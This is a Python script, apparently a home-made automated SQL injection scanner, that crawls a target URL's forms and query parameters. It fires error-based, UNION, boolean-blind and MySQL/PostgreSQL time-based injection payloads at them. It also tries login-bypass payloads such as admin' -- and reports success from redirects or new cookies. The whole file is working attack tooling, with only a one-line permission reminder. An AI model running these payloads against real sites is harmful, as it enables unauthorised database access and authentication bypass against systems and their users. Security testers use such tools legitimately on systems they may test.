import sys
import time
import re
import urllib.parse
from bs4 import BeautifulSoup
import requests
from colorama import Fore, init
from difflib import SequenceMatcher

init(autoreset=True)
SLEEP_THRESHOLD = 4.0        # seconds; time-based detection threshold
SIMILARITY_THRESHOLD = 0.95  # if two responses are very similar, likely no effect
REQUEST_TIMEOUT = 12

class EnhancedAutoScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "FaisalAutoSQLEnhanced/1.0"})
        self.payloads = [
            "'", "''", "\"", "1' OR '1'='1", "1' OR '1'='1' --",
            "' OR '1'='1'", "' OR 1=1--", "admin' --", "1' AND '1'='2",
            "1 UNION SELECT NULL--", "' UNION SELECT NULL, NULL--"
        ]
        # additional payload pairs for boolean testing: (true_payload, false_payload)
        self.bool_pairs = [
            ("' OR '1'='1' -- ", "' OR '1'='2' -- "),
            ("\" OR \"1\"=\"1\" -- ", "\" OR \"1\"=\"2\" -- "),
            ("' OR 1=1-- ", "' OR 1=2-- ")
        ]

        # time-based payloads for MySQL and PostgreSQL (POST / GET contexts)
        self.time_payloads = [
            # MySQL sleep injected into numeric context (classic)
            ("' OR (SELECT IF(1=1, SLEEP(5), 0)) -- ", "MySQL"),
            # PostgreSQL
            ("' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) -- ", "Postgres"),
            # alternative boolean-wrapped
            ("1' AND (SELECT IF(1=1, SLEEP(5), 0))-- ", "MySQL"),
        ]

        self.error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
            r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
            r"Npgsql\.", r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
            r"Warning.*mssql_.*", r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
            r"Oracle error", r"Warning.*\Woci_.*", r"Unclosed quotation mark after the character string",
            r"PDOException", r"SQLSTATE\[HY000\]"
        ]

    def banner(self):
        print(Fore.CYAN + "=" * 60)
        print(Fore.YELLOW + "FAISAL - ENHANCED AUTOMATIC SQL INJECTION SCANNER")
        print(Fore.YELLOW + "Adds boolean- & time-based blind checks plus auth-bypass heuristics")
        print(Fore.CYAN + "=" * 60 + "\n")

    def check_error_patterns(self, text):
        for patt in self.error_patterns:
            if re.search(patt, text, re.IGNORECASE | re.DOTALL):
                return True, patt
        return False, None

    def similarity(self, a, b):
        """Return similarity ratio between two strings (0..1)"""
        return SequenceMatcher(None, a, b).ratio()

    def parse_query_params(self, url):
        p = urllib.parse.urlparse(url)
        return urllib.parse.parse_qs(p.query)

    def get_baseline(self, url, method="get", data=None):
        """Get baseline response text & status for comparison."""
        try:
            if method == "post":
                r = self.session.post(url, data=data or {}, timeout=REQUEST_TIMEOUT)
            else:
                r = self.session.get(url, timeout=REQUEST_TIMEOUT)
            return {"status": r.status_code, "text": r.text, "cookies": r.cookies.get_dict(), "url": r.url}
        except requests.RequestException as e:
            return {"error": str(e)}

    def test_get_param(self, base_url, param, payload):
        p = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(p.query)
        params[param] = payload
        new_q = urllib.parse.urlencode(params, doseq=True)
        test_url = urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))

        start = time.time()
        try:
            r = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
            elapsed = time.time() - start
            has_err, patt = self.check_error_patterns(r.text)
            return {"vulnerable": has_err, "pattern": patt, "status": r.status_code, "url": test_url, "text": r.text, "time": elapsed}
        except requests.RequestException as e:
            return {"vulnerable": False, "error": str(e), "url": test_url}

    def test_post(self, action, fields):
        """Post data and return response info (time, text, status)"""
        start = time.time()
        try:
            r = self.session.post(action, data=fields, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            elapsed = time.time() - start
            has_err, patt = self.check_error_patterns(r.text)
            return {"vulnerable": has_err, "pattern": patt, "status": r.status_code, "text": r.text, "time": elapsed, "cookies": r.cookies.get_dict(), "url": r.url}
        except requests.RequestException as e:
            return {"error": str(e)}

    def extract_forms(self, html, base_url):
        soup = BeautifulSoup(html, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action") or base_url
            action = urllib.parse.urljoin(base_url, action)
            method = (form.get("method") or "get").lower()
            fields = {}
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if not name:
                    continue
                if inp.name == "textarea":
                    val = inp.text or inp.get("value", "")
                elif inp.name == "select":
                    opt = inp.find("option", selected=True) or inp.find("option")
                    val = opt.get("value") if opt and opt.get("value") is not None else (opt.text if opt else "")
                else:
                    val = inp.get("value", "")
                fields[name] = "" if val is None else val
            forms.append({"action": action, "method": method, "fields": fields})
        return forms

    # ---------- Enhanced checks ----------
    def boolean_test_form_field(self, form, field_name):
        """Send a true vs false boolean payload pair and compare responses."""
        baseline = self.get_baseline(form["action"], method=form["method"], data=form["fields"] if form["method"]=="post" else None)
        results = []
        for true_p, false_p in self.bool_pairs:
            # prepare data copies
            data_true = dict(form["fields"]); data_false = dict(form["fields"])
            data_true[field_name] = true_p
            data_false[field_name] = false_p

            # send true
            try:
                if form["method"] == "post":
                    r_true = self.session.post(form["action"], data=data_true, timeout=REQUEST_TIMEOUT, allow_redirects=True)
                else:
                    parsed = urllib.parse.urlparse(form["action"])
                    merged = urllib.parse.parse_qs(parsed.query)
                    merged.update(data_true)
                    q = urllib.parse.urlencode(merged, doseq=True)
                    url_true = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
                    r_true = self.session.get(url_true, timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                continue

            # send false
            try:
                if form["method"] == "post":
                    r_false = self.session.post(form["action"], data=data_false, timeout=REQUEST_TIMEOUT, allow_redirects=True)
                else:
                    parsed = urllib.parse.urlparse(form["action"])
                    merged = urllib.parse.parse_qs(parsed.query)
                    merged.update(data_false)
                    q = urllib.parse.urlencode(merged, doseq=True)
                    url_false = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
                    r_false = self.session.get(url_false, timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                continue

            # compare
            sim = self.similarity(r_true.text, r_false.text)
            # also compare status or redirect or content-length
            status_diff = (r_true.status_code != r_false.status_code)
            len_diff = abs(len(r_true.text) - len(r_false.text))
            results.append({"true_resp_len": len(r_true.text), "false_resp_len": len(r_false.text), "similarity": sim, "status_true": r_true.status_code, "status_false": r_false.status_code})
            # Heuristic: if similarity is low (below threshold) OR status differs significantly OR large length diff -> suspicious
            if sim < SIMILARITY_THRESHOLD or status_diff or len_diff > 200:
                return True, {"similarity": sim, "len_diff": len_diff, "status_diff": status_diff}
        return False, None

    def time_test_form_field(self, form, field_name):
        """Send time-based payloads and check for notable delays."""
        for payload, dbname in self.time_payloads:
            data = dict(form["fields"])
            data[field_name] = payload
            start = time.time()
            try:
                if form["method"] == "post":
                    r = self.session.post(form["action"], data=data, timeout=REQUEST_TIMEOUT, allow_redirects=True)
                else:
                    parsed = urllib.parse.urlparse(form["action"])
                    merged = urllib.parse.parse_qs(parsed.query)
                    merged.update(data)
                    q = urllib.parse.urlencode(merged, doseq=True)
                    url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
                    r = self.session.get(url, timeout=REQUEST_TIMEOUT)
                elapsed = time.time() - start
            except requests.RequestException:
                continue
            # If elapsed exceeds threshold, mark possible blind time-based SQLi
            if elapsed >= SLEEP_THRESHOLD:
                return True, {"elapsed": elapsed, "payload": payload, "db": dbname}
        return False, None

    def test_form_auth_bypass(self, form, field_user_candidates=None, field_pass_candidates=None):
        """
        Heuristic to detect login bypass:
         - submit payloads in username/password
         - check for redirect, change in cookies, or absence/presence of 'invalid' strings
        """
        base = self.get_baseline(form["action"], method=form["method"], data=form["fields"] if form["method"]=="post" else None)
        invalid_markers = ["invalid", "incorrect", "login failed", "error", "try again"]
        # candidate payloads for bypass attempts
        user_payloads = ["admin' -- ", "' OR '1'='1", "admin\" -- ", "admin' #"]
        pass_payloads = ["' OR '1'='1", "password' OR '1'='1' -- "]

        # find likely username/password field names heuristically if not provided
        fields = list(form["fields"].keys())
        username_field = None; password_field = None
        for f in fields:
            if any(x in f.lower() for x in ("user","email","login","uid","username")):
                username_field = f
            if any(x in f.lower() for x in ("pass","pwd","password")):
                password_field = f

        if username_field is None or password_field is None:
            return False, None  # not a typical login form

        for up in user_payloads:
            for pp in pass_payloads:
                data = dict(form["fields"])
                data[username_field] = up
                data[password_field] = pp
                try:
                    r = self.session.post(form["action"], data=data, timeout=REQUEST_TIMEOUT, allow_redirects=False)
                except requests.RequestException:
                    continue
                # Heuristics:
                # - redirect (302) to another page often means login success
                if r.status_code in (301, 302):
                    return True, {"reason": "redirect", "status": r.status_code, "payloads": (up, pp), "location": r.headers.get("Location")}
                # - cookie set/changed after login attempt
                if r.cookies and r.cookies.get_dict():
                    return True, {"reason": "cookies_set", "cookies": r.cookies.get_dict(), "payloads": (up, pp)}
                # - response lacks 'invalid' language compared to baseline
                text = r.text.lower()
                if not any(marker in text for marker in invalid_markers):
                    # If baseline had invalid marker and current does not, suspicious
                    base_has_invalid = False
                    if base and "text" in base:
                        base_has_invalid = any(m in base["text"].lower() for m in invalid_markers)
                    if base_has_invalid:
                        return True, {"reason": "invalid_marker_absent", "payloads": (up, pp)}
        return False, None

    # ---------- Scanning logic ----------
    def scan(self, url):
        print(Fore.GREEN + f"[*] Target: {url}\n")
        vulnerabilities = []

        # 1) GET param tests (error-pattern + boolean + time)
        params = self.parse_query_params(url)
        if params:
            print(Fore.CYAN + f"[*] Detected query parameters: {', '.join(params.keys())}")
            baseline = self.get_baseline(url)
            for param in params.keys():
                print(Fore.YELLOW + f"[*] Testing GET parameter: {param}")
                # error-pattern checks
                for payload in self.payloads:
                    res = self.test_get_param(url, param, payload)
                    if res.get("vulnerable"):
                        vulnerabilities.append({"type": "GET-error", "parameter": param, "payload": payload, "info": res})
                # boolean pair checks: build true/false URLs and compare
                for true_p, false_p in self.bool_pairs:
                    r_true = self.test_get_param(url, param, true_p)
                    r_false = self.test_get_param(url, param, false_p)
                    if "text" in r_true and "text" in r_false:
                        sim = self.similarity(r_true["text"], r_false["text"])
                        if sim < SIMILARITY_THRESHOLD or abs(len(r_true["text"])-len(r_false["text"]))>200:
                            vulnerabilities.append({"type": "GET-boolean", "parameter": param, "info": {"similarity": sim}})
                # time-based GET checks
                for payload, db in self.time_payloads:
                    start = time.time()
                    try:
                        res = self.test_get_param(url, param, payload)
                    except:
                        res = {}
                    if res.get("time", 0) >= SLEEP_THRESHOLD:
                        vulnerabilities.append({"type": "GET-time", "parameter": param, "info": {"time": res.get("time"), "db": db}})
                print()

        # 2) Form parsing + tests
        try:
            page = self.session.get(url, timeout=REQUEST_TIMEOUT)
        except requests.RequestException as e:
            print(Fore.RED + f"[!] Could not fetch page: {e}")
            page = None

        if page:
            forms = self.extract_forms(page.text, page.url)
            if not forms:
                print(Fore.YELLOW + "[!] No forms found on the page.")
            else:
                print(Fore.CYAN + f"[*] Found {len(forms)} form(s). Running enhanced tests...")
                for idx, form in enumerate(forms, 1):
                    print(Fore.MAGENTA + f"\n--- Form {idx} -> action: {form['action']} (method: {form['method'].upper()}) ---")
                    field_names = list(form["fields"].keys())
                    if not field_names:
                        print(Fore.YELLOW + "  [!] No named fields; skipping.")
                        continue
                    print(Fore.CYAN + f"  Fields: {', '.join(field_names)}")
                    # baseline for this form
                    baseline = self.get_baseline(form["action"], method=form["method"], data=form["fields"] if form["method"]=="post" else None)
                    # per-field tests
                    for field in field_names:
                        print(Fore.YELLOW + f"  [*] Field: {field}")
                        # 1) error-pattern scanning using small payload set
                        for p in self.payloads:
                            if form["method"] == "post":
                                data = dict(form["fields"]); data[field] = p
                                res = self.test_post(form["action"], data)
                                if res.get("vulnerable"):
                                    vulnerabilities.append({"type": "FORM-error", "field": field, "payload": p, "info": res})
                            else:
                                # GET-form: similar approach via URL
                                res = self.test_get_param(form["action"], field, p)
                                if res.get("vulnerable"):
                                    vulnerabilities.append({"type": "FORM-error", "field": field, "payload": p, "info": res})
                        # 2) boolean-based blind test
                        b_res, b_info = self.boolean_test_form_field(form, field)
                        if b_res:
                            vulnerabilities.append({"type": "FORM-boolean", "field": field, "info": b_info})
                            print(Fore.RED + f"    [!] Boolean-based difference detected: {b_info}")
                        # 3) time-based blind test
                        t_res, t_info = self.time_test_form_field(form, field)
                        if t_res:
                            vulnerabilities.append({"type": "FORM-time", "field": field, "info": t_info})
                            print(Fore.RED + f"    [!] Time-based delay detected (~{t_info['elapsed']:.1f}s) payload: {t_info['payload']}")
                        # small delay between fields
                        time.sleep(0.3)

                    # 4) auth-bypass heuristics (login forms)
                    auth_res, auth_info = self.test_form_auth_bypass(form)
                    if auth_res:
                        vulnerabilities.append({"type": "AUTH-BYPASS", "info": auth_info})
                        print(Fore.RED + f"    [!] Possible authentication bypass detected: {auth_info}")

        # final summary
        self.summary(url, vulnerabilities)

    def summary(self, url, vulns):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "SCAN SUMMARY")
        print(Fore.CYAN + "=" * 60)
        if not vulns:
            print(Fore.GREEN + "\n[✓] No vulnerabilities detected by heuristics.")
            print(Fore.YELLOW + "[i] This scanner uses heuristics. False negatives are still possible.")
        else:
            print(Fore.RED + f"\n[!] Potential issues found: {len(vulns)}\n")
            for i, v in enumerate(vulns, 1):
                print(Fore.RED + f"{i}. Type: {v.get('type')}")
                for k, val in v.items():
                    if k == "type": continue
                    print(Fore.RED + f"    {k}: {val}")
                print("-" * 60)
        print(Fore.CYAN + "\n" + "=" * 60 + "\n")


def main():
    # prompt or positional arg (same UX as before)
    if len(sys.argv) >= 2:
        target_url = sys.argv[1].strip()
    else:
        print(Fore.YELLOW + "Enter target URL (with http:// or https://) and press Enter:")
        target_url = input().strip()

    if not target_url:
        print(Fore.RED + "No URL provided. Exiting.")
        return
    if not target_url.startswith(("http://", "https://")):
        print(Fore.RED + "Please include http:// or https://")
        return

    print(Fore.YELLOW + "[!] Only test targets you own or have permission to test.\n")
    scanner = EnhancedAutoScanner()
    scanner.banner()
    start = time.time()
    scanner.scan(target_url)
    print(Fore.CYAN + f"[*] Completed in {time.time() - start:.2f} seconds")

if __name__ == "__main__":
    main()
